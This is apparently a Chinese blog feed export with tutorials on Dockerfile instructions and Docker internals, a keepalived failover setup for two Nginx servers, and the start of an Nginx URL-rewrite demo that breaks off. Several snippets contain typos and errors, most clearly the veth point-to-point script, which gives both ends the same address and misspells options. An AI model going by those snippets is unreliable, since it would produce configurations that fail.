<h2><span id="from">FROM</span></h2><p>格式为FROM &lt;image&gt; 或 FROM &lt;image&gt;:&lt;tag&gt;<br>第一条指令必须为FROM指令, 且如果在同一个Dockerfile中创建多了个镜像，可以使用多个FROM</p>
<h2><span id="maintainer">MAINTAINER</span></h2><p>格式为MAINTAINER &lt;name&gt;, 指定维护者信息</p>
<h2><span id="run">RUN</span></h2><p>格式为RUN &lt;command&gt;，或RUN [“executable”, “param1”, “param2”]<br>前者在Shell终端中运行命令, 即<code>/bin/sh -c</code>; 后者使用exec执行，指定其他终端可用后者实现，如RUN[“&#x2F;bin&#x2F;bash”, “-c”, “echo hello”]</p>
<h2><span id="cmd">CMD</span></h2><p>支持三种格式:</p>
<ul>
<li>CMD [“executable”, “param1”, “param2”]，使用exec执行，推荐方式</li>
<li>CMD command param1 param2 在&#x2F;bin&#x2F;sh中执行, 提供给需要交互应用</li>
<li>CMD [“param1,”param2”]提供给ENTRYPOINT的默认参数</li>
</ul>
<p>指定启动容器时执行的命令, 每个Dockerfile只能有一个CMD指令, 如果指定了多个命令, 只有最后一条会被执行<br>如果用户启动容器时指定了运行的命令，则会覆盖掉CMD指定的命令</p>
<h2><span id="expose">EXPOSE</span></h2><p>格式：XPOSE &lt;port&gt;<br>将容器中EXPOSE端口随机映射到宿主机的某个端口 (启动时需要添加-P参数)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ubuntu:14.04</span><br><span class="line">EXPOSE 5000</span><br></pre></td></tr></table></figure>
<p>构建自定义镜像 <code>docker build -t myubuntu:1.0 -f .</code><br>运行容器，通过-P，Docker主机自动分配一个端口映射到5000, -p可以具体指定哪个本地端口映射过来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -it -P myubuntu:1.0 /bin/bash</span><br><span class="line"># docker port dc2</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:32768</span><br><span class="line">5000/tcp -&gt; [::]:32768</span><br></pre></td></tr></table></figure>

<h2><span id="env">ENV</span></h2><p>格式：ENV &lt;key&gt; &lt;value&gt;<br>指定一个环境变量，会被后续RUN指令使用。并在容器中保持，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENV VERSION 9.2</span><br><span class="line">RUN curl -SL http://www.xxx.com/mysql-$VERSION.tar.xz</span><br></pre></td></tr></table></figure>

<h2><span id="add">ADD</span></h2><p>格式为ADD <src> <dest><br>复制指定src到容器中的dest, src可以是Dockerfile所在目录的一个相对路径，或URL，或一个tar文件</dest></src></p>
<h2><span id="copy">COPY</span></h2><p>格式：COPY <src> <dest><br>复制本地主机的src到容器中的dest, 目标路径不存在时，会自动创建<br>当使用本地目录为源目录时，推荐使用COPY</dest></src></p>
<h2><span id="entrypoint">ENTRYPOINT</span></h2><p>支持两种格式：</p>
<ul>
<li>ENTRYPOINT [“exec”, “param1”, “param2”]</li>
<li>ENTRYPOINT command param1 param2</li>
</ul>
<p>ENTRYPOINT指定容器启动后执行的命令，且不可被<code>docker run</code>提供参数覆盖<br>每个Dockerfile只能有一个ENTRYPOINT，当指定多个ENTRYPOINT时，最后一个生效</p>
<h2><span id="volume">VOLUME</span></h2><p>格式：VOLUME [“&#x2F;data”]<br>创建一个可以从本地主机或其他容器挂载的挂载点</p>
<h2><span id="user">USER</span></h2><p>格式：USER &lt;user&gt;<br>指定运行容器时的用户名或UID，后续的RUN也会使用这个用户</p>
<h2><span id="workdir">WORKDIR</span></h2><p>格式：WORKDIR &#x2F;path&#x2F;to&#x2F;workdir<br>为后续的RUN,CMD,ENTRYPOINT配置工作目录<br>可以使用多个WORKDIR指令, 后续指令如果参数是相对路径，会基于之前命令指定的路径，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WORKDIR /a</span><br><span class="line">WORKDIR b</span><br><span class="line">WORKDIR c</span><br><span class="line">RUN pwd</span><br></pre></td></tr></table></figure>
<p>pwd路径:<code>/a/b/c</code></p>
<h2><span id="创建镜像">创建镜像</span></h2><p>写完Dockerfile后，可以通过docker build创建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t &lt;image_name&gt;:&lt;image_tag&gt; -f Dockerfile .</span><br></pre></td></tr></table></figure>

<h1><span id="docker核心技术">Docker核心技术</span></h1><h2><span id="c-s架构">C-S架构</span></h2><ul>
<li>Docker daemon(<code>/usr/bin/dockerd</code>), 作为Docker服务端接收请求，默认监听<code>unix://var/run/docker.sock</code></li>
<li>Docker client(<code>/usr/bin/docker</code>), Docker客户端</li>
</ul>
<p>Docker daemon不直接创建容器，而是请求containerd创建一个容器<br>containerd也不直接创建容器，而是创建一个containerd-shim进程，让这个进程操作容器<br>containerd-shim调用runc启动容器, runc启动完容器后会退出, containerd-shim成为容器进程的父进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                    Docker Daemon</span><br><span class="line">                          |</span><br><span class="line">                      Containerd</span><br><span class="line">                /         |         \</span><br><span class="line">Containerd-shim    Containerd-shim    Containerd-shim</span><br><span class="line">       |                  |                   |</span><br><span class="line">      RunC               RunC                RunC </span><br></pre></td></tr></table></figure>

<h2><span id="containerd">containerd</span></h2><p>containerd是一个容器运行时，为兼容OCI标准，将运行时及其管理功能从Docker Daemon剥离</p>
<ul>
<li>向上为Docker daemon提供gRPC接口, 向下通过containerd-shim结合runC</li>
<li>负责管理镜像, 容器执行</li>
<li>containerd的killMode设置为process(只杀主进程), 这样升级或重启containerd时可以不杀死现有的容器</li>
</ul>
<h2><span id="docker-shim">docker-shim</span></h2><p>每个Docker容器有一个对应的shim进程，shim进程的作用：</p>
<ul>
<li>允许容器运行时(runC)再启动容器后退出，将shim作为容器父进程，这样即使containerd和dockerd都挂了, 容器依然可用</li>
<li>向containerd报告容器退出状态</li>
</ul>
<h2><span id="runc">runC</span></h2><ul>
<li>runC是Docker按照OCF(Open Container Format)标准的一种具体实现</li>
<li>runC从Docker的libcontainer中迁移来，实现容器启停,资源隔离等功能</li>
</ul>
<h2><span id="容器运行时接口cri">容器运行时接口(CRI)</span></h2><p>CRI(Container Runtime Interface)是一个插件接口，简称CRI。使kubelet能够使用容器运行时，无需重新编译集群组件。<br><img data-src="/2024/1123191048/k8s-arch.png"><br>k8s 1.24版本弃用dockershim，直接对接Containerd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubelet    &lt;----CRI----&gt;    CRI-containerd    &lt;----&gt;    containerd    ----&gt;    container</span><br></pre></td></tr></table></figure>

<h2><span id="命名空间namespace">命名空间(Namespace)</span></h2><p>Namespace是Linux内核针对实现容器虚拟化而引入的一个强大特性<br>每个容器可以拥有单独命名空间，运行其中应用像是在独立操作系统中运行一样，命名空间保证容器间彼此互不影响<br>OS中进程共享的资源: 内核,文件系统,网络,PID,UID,IPC,内存,硬盘,CPU</p>
<h3><span id="进程命名空间">进程命名空间</span></h3><p>对于同一进程(同一个task_struct),在不同namespace看到的进程号不相同</p>
<h3><span id="网络命名空间">网络命名空间</span></h3><ul>
<li>通过网络命名空间,实现网络隔离。</li>
<li>一个网络命名空间为进程提供了一个完全独立的网络协议栈视图，包括:网络设备接口,IPv4和IPv6协议栈,IP路由表,防火墙规则,sockets</li>
<li>Docker采用虚拟网络设备(Virtual Network Device)，将不同命名空间的网络设备连接到一起。</li>
</ul>
<p>使用brctl, 可以看到桥接到宿主机docker0网桥的虚拟网口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brctl show</span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">docker0         8000.0242499fb41d       no</span><br></pre></td></tr></table></figure>

<h3><span id="ipc命名空间">IPC命名空间</span></h3><p>同一个IPC命名空间的进程允许进行交互，不同空间进程无法交互</p>
<h3><span id="挂载命名空间">挂载命名空间</span></h3><p>类似chroot,将进程放到一个特性目录执行，挂载命名空间允许不同命名空间进程看到的文件结构不同，这样每个命名空间中进程所看到的文件目录彼此被隔离</p>
<h3><span id="uts命名空间">UTS命名空间</span></h3><p>UTS命名空间允许每个容器拥有独立主机名和域名，从而虚拟出一个有独立主机名和网络空间的环境，就和网络上一台独立主机一样; 默认情况下, Docker容器主机名就是返回容器的ID</p>
<h3><span id="控制组cgroups">控制组(CGroups)</span></h3><p>控制组是Linux内核的一个特性，用于共享资源进行隔离，限制，审计等<br>控制组可以提供对容器的内存，CPU，磁盘IO等资源限制和计费管理<br>安装Docker后,用户可以在&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;目录下看到对Docker组应用的各种限制项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /sys/fs/cgroup/</span><br></pre></td></tr></table></figure>

<h2><span id="docker容器之间怎么隔离的">Docker容器之间怎么隔离的</span></h2><p>Namespace机制 + Control groups技术</p>
<h2><span id="联合文件系统unionfs">联合文件系统(UnionFS)</span></h2><p>一种轻量级的高性能分层文件系统, 支持将文件系统中的修改信息一次提交, 并层层叠加, 同时可以将不同目录挂载到同一虚拟文件系统下<br>UnionFS是实现Docker镜像的技术基础，镜像通过分层进行集成。<br>Docker目前支持的联合文件系统: AUFS, btrfs, vfs, DeviceMapper等</p>
<p><strong>容器网络创建过程</strong><br>Docker创建一个容器时，会具体执行如下操作:</p>
<ul>
<li>创建一对虚拟接口，分别放到本地主机和新容器的命名空间中</li>
<li>本地主机一端虚拟接口连接到默认docker0网桥或指定网桥上，并具有一个以veth开头的唯一名字，如veth1234</li>
<li>容器一端虚拟接口将放到新创建容器中，并修改名字作为eth0。这个接口只在容器命名空间可见</li>
<li>从网桥可用地址中获取一个空闲地址分配给容器eth0，并配置默认网关为docker0的IP地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">容器A(172.17.0.2)      容器B(172.17.0.3)      容器C(172.17.0.4)</span><br><span class="line">      veth                 veth                   veth</span><br><span class="line">          \                  |                    /</span><br><span class="line">            网桥   D  O  C  K  E  R  0 (172.17.0.1)</span><br><span class="line">                             |</span><br><span class="line">                            NAT</span><br><span class="line">                             |</span><br><span class="line">                    主机网卡(192.168.52.200)</span><br></pre></td></tr></table></figure>
<p><strong>容器内路由表如何配置</strong><br>默认网络模式下, 容器的默认路由设置为docker0的IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">宿主机</span><br><span class="line">ifconfig docker0</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">		</span><br><span class="line">容器内</span><br><span class="line">root@89a42a95217e:/# ip addr</span><br><span class="line">32: eth0@if33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">root@89a42a95217e:/# route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0</span><br><span class="line">172.17.0.0      *               255.255.0.0     U     0      0        0 eth0</span><br></pre></td></tr></table></figure>

<p>Docker有4种可选网络模式bridge, host, container, none</p>
<ul>
<li>–net&#x3D;bridge 默认值，在Docker网桥上为容器创建新的网络战</li>
<li>–net&#x3D;host 使用宿主机网络，拥有完全的本地主机接口访问权限, 使用–privileged&#x3D;true参数，甚至允许直接配置主机网络堆栈</li>
<li>–net&#x3D;container 将新建容器进程放到一个已存在容器的网络栈</li>
<li>–net&#x3D;none 让Docker将新容器放到隔离的网络栈中，但是不进行网络配置</li>
</ul>
<h2><span id="docker安全">Docker安全</span></h2><p>Docker容器的安全性, 很大程度上依赖于Linux系统自身。因此评估Docker的安全性, 主要考虑以下方面:</p>
<ul>
<li>Linux内核的命名空间机制提供的容器隔离安全</li>
<li>Linux控制组机制对容器资源的控制能力安全</li>
<li>Linux内核的能力机制所带来的操作权限安全</li>
</ul>
<h3><span id="内核能力机制">内核能力机制</span></h3><ul>
<li>传统Unix系统对进程权限只有root和非root两种, Capability是Linux内核一个强大特性,可以提供细粒度的权限访问控制。</li>
<li>Linux内核从2.2支持能力机制，将权限划分为更加细粒度的操作能力，既可作用在进程，也可以作用在文件</li>
<li>比如, 一个web服务进程绑定在一个小于1024端口，并不需要完整权限，只需授权net_bind_service能力即可</li>
<li>默认情况，Docker启动容器被严格限制只允许使用内核一部分能力</li>
</ul>
<h1><span id="网络启动与配置参数">网络启动与配置参数</span></h1><h2><span id="自定义网桥">自定义网桥</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 先停止服务，删除旧网桥</span><br><span class="line">systemctl stop docker</span><br><span class="line">ip link set dev docker0 down</span><br><span class="line">brctl delbr docker0</span><br><span class="line"></span><br><span class="line"># 创建一个网桥docker0</span><br><span class="line">brctl addbr bridge0</span><br><span class="line">ip addr add 192.168.5.1/24 dev bridge0</span><br><span class="line">ip link set dev bridge0 up</span><br><span class="line"></span><br><span class="line"># 配置Docker服务，默认桥接到创建的网桥上</span><br><span class="line">echo &#x27;DOCKER_OPTS=&quot;-b=bridge0&quot;&#x27; &gt;&gt; /etc/default/docker</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h3><span id="创建一个点到点连接">创建一个点到点连接</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm -net=none ubuntu:14.04 /bin/bash</span><br><span class="line">docker run -it --rm -net=none ubuntu:14.04 /bin/bash</span><br><span class="line"></span><br><span class="line">mkdir -p /var/run/netns</span><br><span class="line">ln -s /proc/$1/ns/net /var/run/netns/$1</span><br><span class="line">ln -s /proc/$2/ns/net /var/run/netns/$2</span><br><span class="line"></span><br><span class="line">ip link add A type veth peer name B</span><br><span class="line"></span><br><span class="line">ip link set A setns $1</span><br><span class="line">ip netns exec $1 addr add 10.1.1.1/32 dev A</span><br><span class="line">ip netns exec $1 ip link set A up</span><br><span class="line">ip netns exec $1 ip route add 10.1.1.2/32 dev A</span><br><span class="line"></span><br><span class="line">ip link set B netns $2 </span><br><span class="line">ip netns exec $2 addr add 10.1.1.1/32 dev B</span><br><span class="line">ip netns exec $2 ip link set B up</span><br><span class="line">ip netns exec $2 ip route add 10.1.1.2/32 dev B</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】《Docker技术入门与实战》—— 杨保华、戴王剑、曹亚仑编著<br>【2】<a href="https://docs.docker.com/get-started/docker-overview/">https://docs.docker.com/get-started/docker-overview/</a><br>【3】<a href="https://cloud.tencent.com/developer/article/1868071">https://cloud.tencent.com/developer/article/1868071</a><br>【4】<a href="https://cloud.tencent.com/developer/article/2327654">https://cloud.tencent.com/developer/article/2327654</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>keepalived双机热备方案实现Nginx高可用</title>
    <url>/2024/1123135607.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>只用一台Nginx做反向代理，如果这台Nginx出现故障(比如宕机)，则服务不可用。<br></p>
<p>以下给出keepalived双机热备方案实现Nginx高可用的方法。先介绍几个概念： <br></p>
<h2><span id="高可用">高可用</span></h2><p>高可用（High Availability）是指系统或服务能够在面对硬件故障、软件崩溃、网络问题等各种故障情况下，仍然保持正常运行或快速恢复的能力，以减少服务中断时间，确保业务连续性和数据完整性。</p>
<h2><span id="双机热备">双机热备</span></h2><p>指一台服务器提供服务，另一台作为备用。当一台服务器不可用时另一台就自动顶上去。</p>
<h2><span id="keepalived">keepalived</span></h2><p>一个开源的高可用解决方案，通过VRRP协议实现故障转移，避免单点故障导致的服务中断。</p>
<h2><span id="keepalived双机热备方案实现nginx高可用的步骤">keepalived双机热备方案实现Nginx高可用的步骤</span></h2><span id="more"></span>

<h3><span id="准备两台nginx环境">准备两台Nginx环境</span></h3><p>安装两台Linux虚拟机，每台虚拟机安装Nginx(<a href="https://pcj600.github.io//2024/1109163902.html">如何安装Nginx</a>)</p>
<ul>
<li>192.168.52.200 (Nginx1)</li>
<li>192.168.52.201 (Nginx2)</li>
</ul>
<p>修改Nginx.conf, 给Nginx1,Nginx2分别添加一个简单的主页<br>Nginx1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen 80;</span><br><span class="line">      server_name localhost;</span><br><span class="line">      location / &#123;</span><br><span class="line">          default_type text/html;</span><br><span class="line">          return 200 &#x27;&lt;h1&gt;welcome to Nginx1&lt;/h1&gt;&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>Nginx2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen 80;</span><br><span class="line">      server_name localhost;</span><br><span class="line">      location / &#123;</span><br><span class="line">          default_type text/html;</span><br><span class="line">          return 200 &#x27;&lt;h1&gt;welcome to Nginx2&lt;/h1&gt;&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line"># ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>启动Nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br></pre></td></tr></table></figure>

<h3><span id="安装并配置keepalived">安装并配置Keepalived</span></h3><p>Nginx1,Nginx2都安装keepalived, 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install keepalived</span><br></pre></td></tr></table></figure>

<p>修改Nginx1的keepalived主配置文件<code>/etc/keepalived/keepalived.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vrrp_script chk_http_port &#123;</span><br><span class="line">    script &quot;/usr/local/bin/keepalived_check_nginx.sh&quot; #心跳检测脚本</span><br><span class="line">    interval 2 #检测脚本执行的间隔，单位是秒）</span><br><span class="line">    weight 2   #权重</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state BACKUP            # 指定keepalived的角色，MASTER为主，BACKUP为备</span><br><span class="line">    interface ens33         # 指定vrrp通讯的网卡, ifconfig查下你的网卡名</span><br><span class="line">    virtual_router_id 66    # 虚拟路由编号，主从要一致</span><br><span class="line">    priority 100            # 优先级，数值越大，获取处理请求的优先级越高</span><br><span class="line">    advert_int 1            # 检查间隔，默认为1s(vrrp组播周期秒数)</span><br><span class="line">    nopreempt               # 设置为不抢占。这个配置只能在BACKUP主机上面设置</span><br><span class="line">    #授权访问</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS      #设置验证类型和密码，MASTER和BACKUP必须使用相同的密码</span><br><span class="line">        auth_pass peter</span><br><span class="line">    &#125;</span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_http_port       # 调用检测脚本</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.52.199      # 设置VIP</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nginx2直接复用Nginx1的keepalived.conf即可<br><br>说明:</p>
<ul>
<li>virtual_router_id指虚拟路由编号，主从要一致。</li>
<li>如果需要主节点恢复后，VIP再转移到主节点，需要设置为state MASTER；</li>
<li>如不需要抢占，可以设置为state BACKUP, 同时设置nopreempt; 对于多个从节点场景，发生故障转移后，根据priority选取MASTER节点。</li>
</ul>
<h3><span id="编写检测脚本">编写检测脚本</span></h3><p>编写<code>keepalived_check_nginx.sh</code>，判断Nginx是否启动。如果Nginx没有启动并且重启也失败，就停止keepalived服务，进行VIP转移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=`ps -C nginx --no-header |wc -l`</span><br><span class="line">if [ $cmd -eq 0 ];then</span><br><span class="line">    systemctl start nginx</span><br><span class="line">    if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then</span><br><span class="line">        killall keepalived</span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>把脚本分别传到Nginx1和Nginx2的<code>/usr/local/bin</code>路径</p>
<h3><span id="配置防火墙">配置防火墙</span></h3><p>VRRP使用组播地址, 必须配置相应firewall规则或关闭firewall，否则会出现脑裂。<br>添加规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface ens33 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT 0 --out-interface ens33 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<p>或者直接关闭firewall</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable firewalld --now</span><br></pre></td></tr></table></figure>

<h3><span id="启动keepalived开始测试">启动keepalived，开始测试</span></h3><h4><span id="测试nginx1-nginx2可以正常访问">测试Nginx1, Nginx2可以正常访问</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.200</span><br><span class="line">Welcome to Nginx1</span><br><span class="line">curl 192.168.52.201</span><br><span class="line">Welcome to Nginx2</span><br></pre></td></tr></table></figure>

<h4><span id="启动nginx1和nginx2的keepalived">启动Nginx1和Nginx2的keepalived</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start keepalived</span><br></pre></td></tr></table></figure>
<p>比如，我先启动Nginx1的keepalived，再启动Nginx2，那么在Nginx1上可以看到VIP(192.168.52.199), Nginx2查不到VIP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ip a</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:36:d4:a9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.52.200/24 brd 192.168.52.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 192.168.52.199/32 scope global ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h4><span id="通过vip访问-可以返回nginx1的主页">通过VIP访问, 可以返回Nginx1的主页</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.199</span><br><span class="line">welcome to Nginx1</span><br></pre></td></tr></table></figure>

<h4><span id="在nginx1构造故障-再通过vip可以访问nginx2的主页">在Nginx1构造故障, 再通过VIP可以访问Nginx2的主页</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 先构造Nginx1故障</span><br><span class="line">curl 192.168.52.199</span><br><span class="line">welcome to Nginx2</span><br></pre></td></tr></table></figure>
<p>构造故障方法，可以是先stop nginx，再mv Nginx主程序</p>
<h4><span id="再恢复nginx1重启nginx和keepalived访问vip仍返回nginx2">再恢复Nginx1(重启Nginx和keepalived)，访问VIP，仍返回Nginx2</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.199</span><br><span class="line">welcome to Nginx2</span><br></pre></td></tr></table></figure>
<p>这是符合预期的，因为我们在配置文件里设置了BACKUP和nopreempt</p>
<h4><span id="最后构造nginx2故障访问vip可以返回nginx1的主页">最后构造Nginx2故障，访问VIP，可以返回Nginx1的主页</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.199</span><br><span class="line">welcome to Nginx1</span><br></pre></td></tr></table></figure>

<h2><span id="keepalived故障转移原理概述">keepalived故障转移原理概述</span></h2><ul>
<li>基于VRRP（Virtual Router Redundancy Protocol）协议，通过在多个服务器之间共享一个虚拟IP地址来实现。</li>
<li>监控到主服务器（Master）出现故障时，备份服务器（Backup）会检测到并自动接管虚拟IP，继续提供服务。</li>
<li>这个过程对客户端是透明的，确保了服务的连续性和高可用性。</li>
</ul>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://www.cnblogs.com/asker009/p/15010773.html">nginx+keepalived高可用配置笔记</a><br>【2】<a href="https://docs.nginx.com/nginx/admin-guide/high-availability/ha-keepalived/">https://docs.nginx.com/nginx/admin-guide/high-availability/ha-keepalived/</a></p>
]]></content>
  </entry>
  <entry>
    <title>Nginx URLRewrite案例演示</title>
    <url>/2024/1123152532.html</url>
    <content><![CDATA[<h1><span id="urlrewrite是什么">URLRewrite是什么</span></h1><p>URL重写, 是Nginx中用于将请求重定向到其他URL的过程</p>
<h1><span id="urlrewrite的应用场景">URLRewrite的应用场景</span></h1><ul>
<li>域名迁移。 当企业更换域名时，通过URL重写将旧域名的访问永久重定向到新域名，避免用户流失。</li>
<li>URL规范化。通过URL重写，使URL更加规范和美观，提升用户体验。</li>
<li>伪静态。重写动态URL为静态URL，提高搜索引擎的收录效率和网站排名</li>
<li>安全性增强。隐藏真实文件目录, 防止攻击者直接访问文件</li>
</ul>
<h1><span id="urlrewrite案例演示">URLRewrite案例演示</span></h1><span id="more"></span>

<h2><span id="案例1-域名迁移">案例1: 域名迁移</span></h2><p>当企业更换域名时，通过URL重写将旧域名的访问永久重定向到新域名，避免用户流失。<br>例如访问京东，通过<code>www.360buy.com</code>, <code>www.jingdong.com</code>，最终都重定向到<code>www.jd.com</code></p>
<p><strong>案例演示</strong><br>访问<code>www.petertest1.cn</code>或<code>www.petertest2.cn</code>, 永久重定向到<code>www.peter.com</code></p>
<h3><span id="创建一台linux虚拟机-准备三个域名">创建一台Linux虚拟机, 准备三个域名</span></h3><p>修改虚拟机的&#x2F;etc&#x2F;hosts文件，内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 www.petertest1.cn</span><br><span class="line">192.168.52.200 www.petertest2.cn</span><br><span class="line">192.168.52.200 www.peter.com</span><br></pre></td></tr></table></figure>
<p>注: 192.168.52.200是我的虚拟机IP</p>
<h3><span id="配置nginx-添加一个服务器-配置重定向">配置Nginx, 添加一个服务器, 配置重定向</span></h3><p>修改nginx.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to peter&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.petertest1.cn www.petertest2.cn; # 需要永久重定向的旧的域名</span><br><span class="line">    rewrite ^(.*) http://www.peter.com$1 permanent; # rewrite实现重定向, 指定permanent返回301永久重定向, 不指定返回302临时重定向</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="测试">测试</span></h3><p>在浏览器访问<code>http://www.petertest1.cn/getUser</code>, 可以成功跳转到<code>http://www.peter.com/getUser</code>，且地址栏显示的也是重定向后的URL: <code>http://www.peter.com/getUser</code><br>再用curl测试，返回301永久重定向, Location为<code>http://www.peter.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.petertest2.cn -i</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.20.1</span><br><span class="line">Date: Sat, 23 Nov 2024 07:05:41 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 169</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://www.peter.com/</span><br></pre></td></tr></table></figure>

<p>另一种实现域名永久重定向的配置方法(不使用URLRewrite)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to peter&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line">    return 301 http://www.peter.com$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>附: 301永久重定向抓包<br>先通过tcpdump抓包<code>tcpdump -i ens33 tcp and port not 22 -w output.pcap</code>, 再用Wireshark分析</p>
<p><img data-src="/2024/1123152532/301.png"></p>
<p>这里可以看出重定向和请求转发的区别：客户端收到301后，客户端会再发起一次新的HTTP请求；而内部转发是服务器行为，客户端感知不到。</p>
<h2><span id="案例2-伪静态">案例2: 伪静态</span></h2><p>伪静态是指，把动态URL转换为静态URL的过程，以对用户更友好的方式显示在浏览器地址栏中。</p>
<p><strong>案例演示</strong><br>假设有一个动态URL<code>http://peter.com/page.php?id=1</code>, 我想重写成伪静态URL<code>http://peter.com/page/1</code>，Nginx中如何实现?</p>
<h3><span id="配置nginx">配置Nginx</span></h3><p>修改nginx.conf</p>
